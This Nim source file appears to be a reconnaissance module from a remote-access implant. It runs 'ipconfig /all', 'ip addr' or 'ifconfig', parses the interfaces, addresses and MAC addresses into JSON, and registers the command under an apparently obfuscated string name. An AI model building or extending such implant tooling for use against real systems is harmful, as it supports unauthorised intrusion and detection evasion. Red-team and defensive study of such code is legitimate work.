import std/[json, osproc, strutils]
import core/types
import commands/registry
import crypto/strenc

proc parseIpAddr(output: string): JsonNode =
  let ifaceArr = newJArray()
  var current: JsonNode = nil
  for line in output.splitLines():
    if line.len == 0: continue
    if line[0].isDigit():
      if current != nil:
        ifaceArr.add(current)
      current = newJObject()
      let parts = line.strip().splitWhitespace()
      current["name"] = if parts.len >= 2: %(parts[1].strip(chars={':'})) else: %""
      current["ipv4"] = %""
      current["ipv6"] = %""
      current["mac"]  = %""
    elif current != nil:
      let stripped = line.strip()
      if stripped.startsWith("inet6 "):
        let parts = stripped.splitWhitespace()
        if parts.len >= 2:
          current["ipv6"] = %parts[1]
      elif stripped.startsWith("inet "):
        let parts = stripped.splitWhitespace()
        if parts.len >= 2:
          current["ipv4"] = %parts[1]
      elif stripped.startsWith("link/"):
        let parts = stripped.splitWhitespace()
        if parts.len >= 2 and ":" in parts[1]:
          current["mac"] = %parts[1]
  if current != nil:
    ifaceArr.add(current)
  result = newJObject()
  result["interfaces"] = ifaceArr

proc parseIpconfig(output: string): JsonNode =
  let ifaceArr = newJArray()
  var current: JsonNode = nil
  for line in output.splitLines():
    if line.len == 0: continue
    if not line.startsWith(" ") and "adapter" in line.toLower():
      if current != nil and current["name"].getStr() != "":
        ifaceArr.add(current)
      current = newJObject()
      current["name"] = %(line.strip().strip(chars={':'}))
      current["ipv4"] = %""
      current["ipv6"] = %""
      current["mac"]  = %""
    elif current != nil and ":" in line:
      let colonIdx = line.rfind(':')
      if colonIdx < 0: continue
      let value = line[colonIdx + 1..^1].strip()
      let key = line[0..<colonIdx].toLower()
      if "ipv4" in key or ("ip address" in key and "ipv6" notin key):
        current["ipv4"] = %(value.replace("(Preferred)", "").strip())
      elif "ipv6" in key:
        current["ipv6"] = %(value.replace("(Preferred)", "").strip())
      elif "physical" in key:
        current["mac"] = %value
  if current != nil and current["name"].getStr() != "":
    ifaceArr.add(current)
  result = newJObject()
  result["interfaces"] = ifaceArr

proc ifconfigExecute(taskId: string, params: JsonNode, state: AgentState,
                     send: SendMsg): TaskResult =
  try:
    when defined(windows):
      let (out1, _) = execCmdEx("ipconfig /all", options = {poStdErrToStdOut})
      let data = parseIpconfig(out1)
      return TaskResult(output: $data, status: "success", completed: true)
    else:
      let (out1, code1) = execCmdEx("ip addr", options = {poStdErrToStdOut})
      let raw = if code1 == 0: out1
                else: execCmdEx("ifconfig", options = {poStdErrToStdOut})[0]
      let data = parseIpAddr(raw)
      return TaskResult(output: $data, status: "success", completed: true)
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initIfconfig*() =
  register(hidstr("ifconfig"), ifconfigExecute)
